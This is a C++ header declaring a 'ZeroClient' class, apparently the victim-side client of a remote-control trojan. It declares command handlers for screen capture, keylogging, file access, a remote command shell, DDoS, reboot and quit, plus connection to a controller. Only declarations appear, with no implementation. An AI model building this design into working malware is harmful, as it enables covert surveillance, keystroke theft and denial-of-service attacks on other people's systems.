#ifndef ZEROCLIENT_H
#define ZEROCLIENT_H

#include "tcpsocket.h"
#include <iostream>
#include <string>
#include <map>
#include <vector>
#include "screenspy.h"
#include "keyboardspy.h"
#include "filespy.h"
#include "cmdspy.h"
#include "ddosspy.h"

class ZeroClient
{
public:
    ZeroClient();

    HINSTANCE hInst;

     std::string CmdScreenSpy;
     std::string CmdKeyboardSpy;
     std::string CmdFileSpy;
     std::string CmdCmdSpy;
	 std::string CmdDdosSpy;
     std::string CmdSendMessage;
     std::string CmdReboot;
     std::string CmdQuit;

     std::string CmdLogin;

     std::string CmdSplit;
     std::string CmdEnd;

    void connectTo(std::string domain, int port);

private:
    TcpSocket mSock;
    std::string mBuf;

    std::string getUserName();
    std::string getSystemModel();

    bool sendLogin();

    void addDataToBuffer(char *data, int size);
    void processCmd(std::string &cmd, std::string &data);
    std::map<std::string, std::string> parseArgs(std::string &data);

    void doScreenSpy(std::map<std::string, std::string> &args);
    void doKeyboardSpy(std::map<std::string, std::string> &args);
    void doFileSpy(std::map<std::string, std::string> &args);
    void doCmdSpy(std::map<std::string, std::string> &args);
	void doDdosSpy(std::map<std::string,std::string> &args);
    void doSendMessage(std::map<std::string, std::string> &args);
    void doReboot(std::map<std::string, std::string> &args);
    void doQuit(std::map<std::string, std::string> &args);
};

#endif // ZEROCLIENT_H
